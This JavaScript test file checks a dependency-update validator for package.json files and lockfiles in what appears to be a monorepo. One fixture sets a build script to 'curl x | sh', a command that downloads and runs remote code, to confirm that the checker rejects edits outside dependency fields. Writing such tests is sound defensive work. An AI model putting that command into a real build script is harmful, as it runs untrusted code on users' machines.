import assert from "node:assert/strict"
import { describe, it } from "node:test"
import { checkManifest, newLockfileVersions } from "../check-patch.mjs"

const limits = { files: 10, lines: 200, newDependencies: 2 }
const group = (kind) => ({
  kind,
  packages: [{ name: "vite", changes: [{ to: "8.0.3" }, { to: "8.0.1" }] }],
})
const manifest = (deps, extra = {}) => ({
  name: "@medusajs/a",
  version: "1.0.0",
  devDependencies: deps,
  ...extra,
})

describe("checkManifest", () => {
  it("accepts a bump of a planned package up to its target", () => {
    const { problems } = checkManifest({
      file: "packages/a/package.json",
      before: manifest({ vite: "^7.0.0" }),
      after: manifest({ vite: "^8.0.3" }),
      group: group("major"),
      limits,
    })
    assert.deepEqual(problems, [])
  })

  it("rejects versions past the target, unplanned packages, and non-dependency edits", () => {
    const { problems } = checkManifest({
      file: "packages/a/package.json",
      before: manifest(
        { vite: "^7.0.0", uuid: "^9.0.0" },
        { scripts: { build: "tsc" } }
      ),
      after: manifest(
        { vite: "^8.1.0", uuid: "^11.0.0" },
        { scripts: { build: "curl x | sh" } }
      ),
      group: group("major"),
      limits,
    })
    assert.equal(problems.length, 3)
    assert.match(problems.join("\n"), /changes outside dependency fields/)
    assert.match(problems.join("\n"), /"\^8\.1\.0" goes past 8\.0\.3/)
    assert.match(problems.join("\n"), /uuid is not in this update/)
  })

  it("allows a few new devDependencies only for majors", () => {
    const args = {
      file: "package.json",
      before: manifest({ vite: "^7.0.0" }),
      after: manifest({ vite: "^8.0.3", globals: "^16.0.0" }),
      limits,
    }
    assert.deepEqual(checkManifest({ ...args, group: group("major") }).added, [
      "globals",
    ])
    assert.match(
      checkManifest({ ...args, group: group("minor") }).problems.join("\n"),
      /added devDependencies\.globals/
    )
  })
})

describe("newLockfileVersions", () => {
  it("lists only versions that weren't resolved before", () => {
    const base =
      '"a@npm:^1.0.0":\n  version: 1.0.0\n\n"b@npm:^2.0.0":\n  version: 2.0.0\n'
    const head =
      '"a@npm:^1.0.0":\n  version: 1.0.1\n\n"b@npm:^2.0.0":\n  version: 2.0.0\n\n"c@npm:^3.0.0":\n  version: 3.0.0\n'
    const fresh = newLockfileVersions(base, head)
    assert.deepEqual(
      [...fresh].map(
        ([name, versions]) => `${name}@${[...versions].join(",")}`
      ),
      ["a@1.0.1", "c@3.0.0"]
    )
  })
})
